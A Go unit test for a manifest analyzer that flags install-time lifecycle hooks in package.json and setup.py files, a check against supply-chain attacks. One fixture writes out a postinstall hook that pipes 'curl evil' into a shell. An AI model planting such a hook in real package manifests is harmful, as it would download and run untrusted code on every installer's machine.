package manifest

import "testing"

func TestAnalyze(t *testing.T) {
	cases := []struct {
		name    string
		path    string
		content string
		want    bool
	}{
		// package.json — whole-file writes, parsed as JSON.
		{"postinstall script", "/p/package.json", `{"name":"x","scripts":{"postinstall":"node bad.js"}}`, true},
		{"preinstall script", "pkg/package.json", `{"scripts":{"preinstall":"sh x"}}`, true},
		{"install script", "package.json", `{"scripts":{"install":"node-gyp rebuild"}}`, true},
		{"only ordinary scripts", "package.json", `{"scripts":{"build":"tsc","test":"jest","start":"node ."}}`, false},
		{"husky prepare not flagged", "package.json", `{"scripts":{"prepare":"husky install"}}`, false},
		{"no scripts at all", "package.json", `{"name":"x","version":"1.0.0"}`, false},
		{"hook name only in a value", "package.json", `{"scripts":{"test":"echo run postinstall"}}`, false},

		// package.json — Edit fragments (not standalone JSON).
		{"fragment adds postinstall", "package.json", `"postinstall": "curl evil | sh",`, true},
		{"fragment spaced key", "package.json", "\"postinstall\"  :  \"x\"", true},
		{"fragment adds ordinary script", "package.json", `"build": "tsc",`, false},

		// setup.py.
		{"setup cmdclass override", "setup.py", "setup(name='x', cmdclass={'install': Custom})", true},
		{"setup plain", "setup.py", "setup(name='x', version='1.0')", false},

		// Non-manifest files are ignored even if they mention a hook.
		{"tsconfig is not a manifest", "tsconfig.json", `{"postinstall":"x"}`, false},
		{"go source", "main.go", "package main", false},
	}

	for _, tc := range cases {
		t.Run(tc.name, func(t *testing.T) {
			if got := Analyze(tc.path, tc.content).LifecycleHook; got != tc.want {
				t.Errorf("Analyze(%q).LifecycleHook = %v, want %v", tc.path, got, tc.want)
			}
		})
	}
}
